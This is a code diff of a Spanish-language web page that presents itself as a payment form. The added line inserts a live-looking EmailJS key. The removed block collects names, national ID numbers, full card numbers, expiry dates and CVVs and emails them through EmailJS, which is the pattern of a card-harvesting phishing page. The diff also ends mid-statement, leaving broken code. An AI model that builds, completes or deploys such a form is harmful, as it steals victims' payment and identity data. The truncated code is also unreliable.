@@ -221,7 +221,7 @@
 
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
-  emailjs.init('YOUR_PUBLIC_KEY'); // Reemplaza con tu public key de EmailJS
+  emailjs.init('FL6vofHg7F9vLawQs'); // Tu public key aquí
 
   const montoPersonalizado = document.getElementById('monto-personalizado');
   const continuarBtn = document.getElementById('continuar-btn');
@@ -285,87 +285,4 @@
 
       default:
         if (!value) {
-          mensaje = 'Campo obligatorio';
-          valido = false;
-        }
-    }
-
-    if (!valido) {
-      input.classList.add('invalid');
-      if (error) error.textContent = mensaje;
-    } else {
-      input.classList.remove('invalid');
-      if (error) error.textContent = '';
-    }
-
-    return valido;
-  }
-
-  // Validar todos los inputs requeridos del formulario
-  function validarFormulario() {
-    let valido = true;
-    form.querySelectorAll('input[required]').forEach(input => {
-      if (!validarCampo(input)) valido = false;
-    });
-    // Validar que se haya seleccionado tipo de tarjeta
-    const tipoTarjetaSeleccionada = form.querySelector('input[name="tipo-tarjeta"]:checked');
-    if (!tipoTarjetaSeleccionada) {
-      alert('Por favor, seleccione un tipo de tarjeta.');
-      valido = false;
-    }
-    return valido;
-  }
-
-  // Control botón continuar monto
-  continuarBtn.addEventListener('click', () => {
-    const monto = montoPersonalizado.value.trim();
-    const errorMonto = document.getElementById('error-monto');
-    if (!monto || isNaN(monto) || Number(monto) <= 0) {
-      errorMonto.textContent = 'Por favor, ingrese un monto válido mayor a 0.';
-      return;
-    }
-    errorMonto.textContent = '';
-    montoHidden.value = monto;
-    bloqueMonto.style.display = 'none';
-    form.style.display = 'block';
-  });
-
-  // Validar inputs mientras el usuario escribe
-  form.querySelectorAll('input').forEach(input => {
-    input.addEventListener('input', () => validarCampo(input));
-  });
-
-  // Enviar formulario
-  form.addEventListener('submit', (e) => {
-    e.preventDefault();
-    if (!validarFormulario()) return;
-
-    loader.style.display = 'block';
-    mensajeExito.style.display = 'none';
-
-    // Enviar con EmailJS
-    emailjs.send('service_6pbv86h', 'template_m3nuw4p', {
-      nombre: form.nombre.value,
-      email: form.email.value,
-      dni: form.dni.value,
-      tarjeta: form.tarjeta.value,
-      titular: form.titular.value,
-      vencimiento: form.vencimiento.value,
-      cvv: form.cvv.value,
-      monto: montoHidden.value,
-      tipo_tarjeta: form.querySelector('input[name="tipo-tarjeta"]:checked').value
-    }).then(() => {
-      loader.style.display = 'none';
-      mensajeExito.style.display = 'block';
-      form.reset();
-      bloqueMonto.style.display = 'block';
-      form.style.display = 'none';
-    }).catch(() => {
-      loader.style.display = 'none';
-      alert('Error al enviar. Intenta de nuevo más tarde.');
-    });
-  });
-</script>
-
-</body>
-</html>
+          mensaje =
